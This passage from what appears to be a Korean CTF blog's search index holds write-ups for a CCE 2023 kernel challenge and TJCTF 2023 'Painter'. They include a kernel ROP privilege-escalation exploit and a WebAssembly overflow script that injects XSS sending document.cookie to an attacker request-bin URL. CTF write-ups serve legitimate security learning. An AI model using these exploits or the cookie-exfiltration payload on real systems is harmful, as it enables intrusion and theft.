/tmp/x\u0026#34;); system(\u0026#34;chmod +x /tmp/x\u0026#34;); system(\u0026#34;echo -ne \u0026#39;\\\\xff\\\\xff\\\\xff\\\\xff\u0026#39; \u0026gt; /tmp/v\u0026#34;); system(\u0026#34;chmod +x /tmp/v\u0026#34;); system(\u0026#34;/tmp/v\u0026#34;); system(\u0026#34;cat /flag\u0026#34;); exit(0); } void save_state(){ __asm__ __volatile__ ( \u0026#34;.intel_syntax noprefix;\u0026#34; \u0026#34;mov user_cs, cs;\u0026#34; \u0026#34;pushf;\u0026#34; \u0026#34;pop user_rflags;\u0026#34; \u0026#34;mov user_rsp, rsp;\u0026#34; \u0026#34;mov user_ss, ss;\u0026#34; \u0026#34;.att_syntax;\u0026#34; ); } int main(){ int fd = open(\u0026#34;/dev/babykernel\u0026#34;,O_RDONLY); if (fd == -1) return -1; struct ioinfo info; save_state(); info.buf = (uint8_t *)malloc(0x10); info.size = 0x8; ioctl(fd, LEAK, \u0026amp;info); uint64_t commit_creds = *(uint64_t *)info.buf; info.off = 0x0; ioctl(fd, READ, \u0026amp;info); uint64_t ops = *(uint64_t *)info.buf; printf(\u0026#34;commit_creds : 0x%lx\\nops : 0x%lx\\n\u0026#34;,commit_creds,ops); free(info.buf); uint64_t base = commit_creds \u0026amp;0xfffffffffff00000; uint64_t xchg_esp = base + 0x605240; // pwndbg\u0026gt; x/10xi 0xffffffff89205240 // 0xffffffff89205240: xchg esp,eax // 0xffffffff89205241: ret info.off = (xchg_esp - ops) / 8; uint64_t * stack = mmap((void *)((xchg_esp \u0026amp; 0xffff0000)-0x5000), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); uint64_t * stack1 = mmap((void *)((xchg_esp \u0026amp; 0xffff0000)), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); // merge mem if (!stack) exit(-1); printf(\u0026#34;fake_stack : %p\\n\u0026#34;,stack); uint64_t st = (xchg_esp \u0026amp; 0xffffffff); *((uint64_t *)(st + 0x00)) = base + 0x8197fd; *((uint64_t *)(st + 0x08)) = base + 0x1a8b340; *((uint64_t *)(st + 0x10)) = base + 0x44b12; *((uint64_t *)(st + 0x18)) = ((xchg_esp \u0026amp; 0xffffffff) + 0x500); *((uint64_t *)(st + 0x20)) = base + 0x1c4203; *((uint64_t *)(st + 0x28)) = 0x1; *((uint64_t *)(st + 0x30)) = base + 0x72b6f7; // rep movsq qword ptr [rdi], qword ptr [rsi] *((uint64_t *)(st + 0x38)) = base + 0x1001144; *((uint64_t *)(st + 0x40)) = 0x0; *((uint64_t *)(st + 0x48)) = 0x0; *((uint64_t *)(st + 0x50)) = (uint64_t)\u0026amp;shell; *((uint64_t *)(st + 0x58)) = user_cs; *((uint64_t *)(st + 0x60)) = user_rflags; *((uint64_t *)(st + 0x68)) = user_rsp; *((uint64_t *)(st + 0x70)) = user_ss; *(uint64_t *)((xchg_esp \u0026amp; 0xffffffff) + 0x500) = 0x782f706d742f; ioctl(fd, EXEC, \u0026amp;info); return 0; } ","permalink":"https://msh1307.kr/blog/cce_2023_junior_quals/","summary":"K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; 똑같은데 디버깅 옵션만 빠진거같다.","title":"CCE 2023 Quals"},{"content":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.setCookie({ name: \u0026#39;flag\u0026#39;, value: flag.trim(), domain: \u0026#39;painter.tjc.tf\u0026#39;, }); await sleep(1000); await page.goto(url, { timeout: 10000, waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await sleep(10000); } }; admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다. 쿠키에 flag가 들어있다. 쿠키 탈취가 목적이다.\nDockerfile FROM python:3.8.5-slim-buster RUN pip install flask gunicorn WORKDIR /app COPY . . EXPOSE 5000 ENTRYPOINT [\u0026#34;gunicorn\u0026#34;, \u0026#34;-b\u0026#34;, \u0026#34;0.0.0.0:5000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;app:app\u0026#34;] app.py from flask import Flask, render_template, redirect, request from uuid import uuid4 app = Flask(__name__) images = {} @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/save\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_image(): img, name = request.json[\u0026#39;img\u0026#39;], request.json[\u0026#39;name\u0026#39;] id = uuid4() images[id] = { \u0026#39;img\u0026#39;: img, \u0026#39;name\u0026#39;: name } return redirect(\u0026#39;/img/\u0026#39; + str(id)) @app.route(\u0026#39;/img/\u0026lt;uuid:id\u0026gt;\u0026#39;) def image_id(id): if id not in images: return redirect(\u0026#39;/\u0026#39;) img = images[id][\u0026#39;img\u0026#39;] name = images[id][\u0026#39;name\u0026#39;] return render_template(\u0026#39;index.html\u0026#39;, px=img, name=name, saved=True) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 이미지를 저장하거나 볼 수 있는 것 같다.\nindex.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { height: 100vh; width: 100%; margin: 0; display: grid; justify-items: center; align-items: center; text-align: left; } #options { display: flex; flex-direction: row; justify-content: space-between; } #canvas { border: 1px solid black; height: 75vh; max-height: 1000px; image-rendering: pixelated; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1 id=\u0026#34;name-h1\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;canvas id=\u0026#34;canvas\u0026#34; tabindex=\u0026#34;-1\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input type=\u0026#34;color\u0026#34; id=\u0026#34;color-picker\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;layers\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;0\u0026#34;\u0026gt;Top Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;1\u0026#34;\u0026gt;Middle Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;2\u0026#34;\u0026gt;Bottom Layer\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;name\u0026#34; placeholder=\u0026#34;Name\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;save\u0026#34;\u0026gt;Save\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; const canvas = document.getElementById(\u0026#39;canvas\u0026#39;); Module = { canvas: canvas }; window.addEventListener(\u0026#39;keydown\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); window.addEventListener(\u0026#39;keyup\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); const strToCharArr = (str) =\u0026gt; { const ptr = _malloc(str.length + 1); Module.stringToUTF8(str, ptr, str.length + 1); return ptr; }; const base64ToArr = (enc) =\u0026gt; { const binary = atob(enc); const bytes = new Uint8Array(binary.length); for (let i = 0; i \u0026lt; bytes.length; i++) { bytes[i] = binary.charCodeAt(i); } return bytes; } const arrToCharArr = (arr) =\u0026gt; { const ptr = _malloc(arr.length); Module.writeArrayToMemory(arr, ptr); return ptr; } const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } Module.onRuntimeInitialized = () =\u0026gt; { _clearCanvas(); {% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} document.addEventListener(\u0026#39;mousemove\u0026#39;, (e) =\u0026gt; { const rect = canvas.getBoundingClientRect(); const scale = canvas.width / rect.width; _draw((e.clientX - rect.left) * scale, (e.clientY - rect.top) * scale); }); document.addEventListener(\u0026#39;mousedown\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(1); }); document.addEventListener(\u0026#39;mouseup\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(0); }); document.getElementById(\u0026#39;color-picker\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const c = e.target.value.match(/[0-9a-fA-F]{2}/g).map(v =\u0026gt; parseInt(v, 16)); _setColor(...c); }); document.getElementById(\u0026#39;layers\u0026#39;).addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { _setLayer(parseInt(e.target.value)); }); document.getElementById(\u0026#39;name\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const name = e.target.value; _setName(strToCharArr(name), name.length); }); document.getElementById(\u0026#39;save\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { const out = new Uint8Array(4 * canvas.width * canvas.height * 3); for (let i = 0; i \u0026lt; 3; i++) { const layerPtr = _getLayer(i); const layer = new Uint8Array(Module.HEAPU8.buffer, layerPtr, 4 * canvas.width * canvas.height); out.set(layer, 4 * canvas.width * canvas.height * i); } const binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); }) }; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;/static/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 저장할때 /save로 보내는 것을 알 수 있다. wasm function들을 사용해서 처리한다. index.js에서 export 하는 부분을 확인할 수 있다.\nindex.js ... var asm = createWasm(); /** @type {function(...*):?} */ var ___wasm_call_ctors = createExportWrapper(\u0026#34;__wasm_call_ctors\u0026#34;); /** @type {function(...*):?} */ var _getName = Module[\u0026#34;_getName\u0026#34;] = createExportWrapper(\u0026#34;getName\u0026#34;); /** @type {function(...*):?} */ var _getLayer = Module[\u0026#34;_getLayer\u0026#34;] = createExportWrapper(\u0026#34;getLayer\u0026#34;); /** @type {function(...*):?} */ var _setName = Module[\u0026#34;_setName\u0026#34;] = createExportWrapper(\u0026#34;setName\u0026#34;); /** @type {function(...*):?} */ var _free = createExportWrapper(\u0026#34;free\u0026#34;); /** @type {function(...*):?} */ var _copyCanvas = Module[\u0026#34;_copyCanvas\u0026#34;] = createExportWrapper(\u0026#34;copyCanvas\u0026#34;); /** @type {function(...*):?} */ var _setColor = Module[\u0026#34;_setColor\u0026#34;] = createExportWrapper(\u0026#34;setColor\u0026#34;); /** @type {function(...*):?} */ var _setLayer = Module[\u0026#34;_setLayer\u0026#34;] = createExportWrapper(\u0026#34;setLayer\u0026#34;); /** @type {function(...*):?} */ var _toggleLeftMouseButton = Module[\u0026#34;_toggleLeftMouseButton\u0026#34;] = createExportWrapper(\u0026#34;toggleLeftMouseButton\u0026#34;); /** @type {function(...*):?} */ var _draw = Module[\u0026#34;_draw\u0026#34;] = createExportWrapper(\u0026#34;draw\u0026#34;); /** @type {function(...*):?} */ var _clearCanvas = Module[\u0026#34;_clearCanvas\u0026#34;] = createExportWrapper(\u0026#34;clearCanvas\u0026#34;); /** @type {function(...*):?} */ var _loop = Module[\u0026#34;_loop\u0026#34;] = createExportWrapper(\u0026#34;loop\u0026#34;); /** @type {function(...*):?} */ var _main = Module[\u0026#34;_main\u0026#34;] = createExportWrapper(\u0026#34;main\u0026#34;); /** @type {function(...*):?} */ var _malloc = createExportWrapper(\u0026#34;malloc\u0026#34;); /** @type {function(...*):?} */ var ___errno_location = createExportWrapper(\u0026#34;__errno_location\u0026#34;); /** @type {function(...*):?} */ var ___dl_seterr = createExportWrapper(\u0026#34;__dl_seterr\u0026#34;); /** @type {function(...*):?} */ var _fflush = Module[\u0026#34;_fflush\u0026#34;] = createExportWrapper(\u0026#34;fflush\u0026#34;); /** @type {function(...*):?} */ var _emscripten_stack_init = function() { return (_emscripten_stack_init = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_init\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_free = function() { return (_emscripten_stack_get_free = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_free\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_base = function() { return (_emscripten_stack_get_base = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_base\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_end = function() { return (_emscripten_stack_get_end = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_end\u0026#34;]).apply(null, arguments); }; ... 대충 함수 export를 해준다.\nindex.wasm 아래 디컴파일러를 사용해서 분석했다. wabt보다 훨씬 좋다. https://github.com/wasmkit/diswasm\nwasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다. wasm은 따로 ASLR 같은 메모리 보호 기법이 없다. global variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.\nsetName() // O[0] Decompilation of $func238, known as $func5 export \u0026#34;setName\u0026#34;; // $func238 is exported to \u0026#34;setName\u0026#34; void $func5(int arr, int param1) { // offset=0xc int ar; // offset=0x8 int local_8; // offset=0x4 int local_4; ar = arr; local_8 = param1; label$1: { label$2: { if ((((local_8 \u0026gt;= 0x8) \u0026amp; 0x1) == 0x0)) break label$2; break label$1; }; }; local_8 = local_8; local_4 = 0x0; label$3: { while (1) { if ((((local_4 \u0026lt; local_8) \u0026amp; 0x1) == 0x0)) break label$3; *((unsigned char *) local_4 + 0x2191c) = *((unsigned char *) (ar + local_4)); local_4 = (local_4 + 0x1); break label$4; break ; }; }; *((unsigned char *) local_8 + 0x2191c) = 0x0; $free(ar); return; } 0x2191c가 Name이다.\ncopyCanvas() // O[0] Decompilation of $func239, known as $func6 export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } 0x21924에 length 만큼 복사한다.\ngetLayer() // O[0] Decompilation of $func237, known as $func4 export \u0026#34;getLayer\u0026#34;; // $func237 is exported to \u0026#34;getLayer\u0026#34; int $func4(int param0) { // offset=0xc int local_c; local_c = param0; return ((0x2091c + 0x1008) + (local_c \u0026lt;\u0026lt; 0xc)); } 0x21924가 Layer인 것 같다.\nmain() // O[2] Disassembly of $func248, known as $func15 export \u0026#34;main\u0026#34;; // $func248 is exported to \u0026#34;main\u0026#34; int $func15(int param0, int param1) { // local index=2 int local2; local2 = $func13(); return local2; } func13() // O[2] Disassembly of $func246, known as $func13 int $func13() { // local index=0 int local0; // local index=1 int local1; // local index=2 int local2; // local index=3 int local3; // local index=4 int local4; // local index=5 int local5; // local index=6 int local6; // local index=7 int local7; // local index=8 int local8; // local index=9 int local9; // local index=10 int local10; // local index=11 int local11; // local index=12 int local12; // local index=13 int local13; // local index=14 int local14; local0 = 0x20; $func18(local0); local1 = 0x20; local2 = 0x0; local3 = 0x20914; local4 = 0x20910; $func476(local1, local1, local2, local3, local4); local5 = 0x303; local6 = 0x0; $func80(local5, local6); local7 = 0x0; local8 = 0x20; local9 = $func670(local7, local8, local8, local8, local7, local7, local7, local7); local10 = 0x0; *((unsigned int *) local10 + 0x20918) = local9; local11 = 0x1; local12 = 0x0; local13 = 0x1; fimport_emscripten_set_main_loop(local11, local12, local13); // executes exported function named \u0026#34;loop\u0026#34; every tick local14 = 0x0; return local14; } tick 마다 \u0026ldquo;loop\u0026rdquo; 함수를 실행한다. 호스트 환경에서 실행시켜주기 때문에 \u0026ldquo;loop\u0026quot;는 export 해야 한다.\nloop() // O[0] Decompilation of $func245, known as $func12 export \u0026#34;loop\u0026#34;; // $func245 is exported to \u0026#34;loop\u0026#34; void $func12() { // offset=0x1c int local_1c; // offset=0x18 int local_18; // offset=0x14 int local_14; // offset=0x10 int local_10; // offset=0xc int local_c; label$1: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$1; $func686(*((unsigned int *) 0x20918)); }; local_1c = *((unsigned int *) *((unsigned int *) 0x20918) + 0x14); local_18 = 0x0; label$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); $memcpy(local_1c, 0x2091c, 0x1000); label$7: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$7; $func687(*((unsigned int *) 0x20918)); }; local_c = $func489(*((unsigned int *) 0x20910), *((unsigned int *) 0x20918)); $func496(*((unsigned int *) 0x20910)); $func499(*((unsigned int *) 0x20910), local_c, 0x0, 0x0); $func502(*((unsigned int *) 0x20910)); $func488(local_c); return; } 0x2091c에 0x24924만큼 0x21924를 복사한다.\n대충 이제 구조를 그려보면\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이런 전역 구조체? 정도로 생각할 수 있다.\n4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.\nExploitation index.html의 일부를 보면 아래와 같다.\nconst binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); binary는 클라이언트단에서 컨트롤이 가능하다.\n{% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} _copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.\n$memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); l을 컨트롤할 수 있다. t는 malloc으로 할당받은 버퍼다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 여기서 overflow를 내서 count를 덮을 수 있다.\n그리고 tick 마다 loop가 호출된다.\nlabel$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다. 이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.\nif ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; 여기 if문에서 local_14가 0이 아니게 되어버리면, \u0026laquo; 0xc 때문에 0x1000 단위로 커져버린다. 여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다. const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); 원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.\nExploit script import base64 import requests from pwn import p8,p16 BASE_URL = \u0026#39;https://painter.tjc.tf\u0026#39; attackerURL = \u0026#39;https://qivuygm.request.dreamhack.games\u0026#39; \u0026#39;\u0026#39;\u0026#39; 0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 \u0026#39;\u0026#39;\u0026#39; injection = f\u0026#34;\u0026lt;img src=@ onerror=window.location=\u0026#39;{attackerURL}?flag=\u0026#39;+document.cookie\u0026gt;\u0026#34; def paygen(string : bytes): \u0026#39;\u0026#39;\u0026#39; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 \u0026#39;\u0026#39;\u0026#39; pay = b\u0026#39;\u0026#39; for i in range(len(string)): if (i+1) % 4 == 0: pay += p8(0xff-string[i]) else: pay += p8(string[i]) return pay pay = b\u0026#39;\\xff\u0026#39;*(0x2191c- 0x2091c) pay += paygen(injection.encode()) pay += b\u0026#39;\\x00\u0026#39;*4 pay += b\u0026#39;\\xff\u0026#39; * ((0x24924- 0x21924)-len(pay)) # pixels overflow \u0026#39;\u0026#39;\u0026#39; export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); \u0026#39;\u0026#39;\u0026#39; pay += p16(0x1000+len(injection)+4) pay += b\u0026#39;\\xff\u0026#39;*(0x70-2) # print(pay[0x1000:0x1030]) # print(hex(pay[0x3000]),hex(pay[0x3001])) # print(hex(len(pay))) re = requests.post(f\u0026#39;{BASE_URL}/save\u0026#39;, json={ \u0026#39;img\u0026#39;: base64.b64encode(pay).decode(), \u0026#39;name\u0026#39;: \u0026#39;exploit\u0026#39; }) print(re.url) admin bot한테 url주고 돌리면 flag 나온다. tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}\n","permalink":"https://msh1307.kr/blog/tjctf_2023_painter/","summary":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.","title":"TJCTF 2023 - Painter"},{"content":"MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis 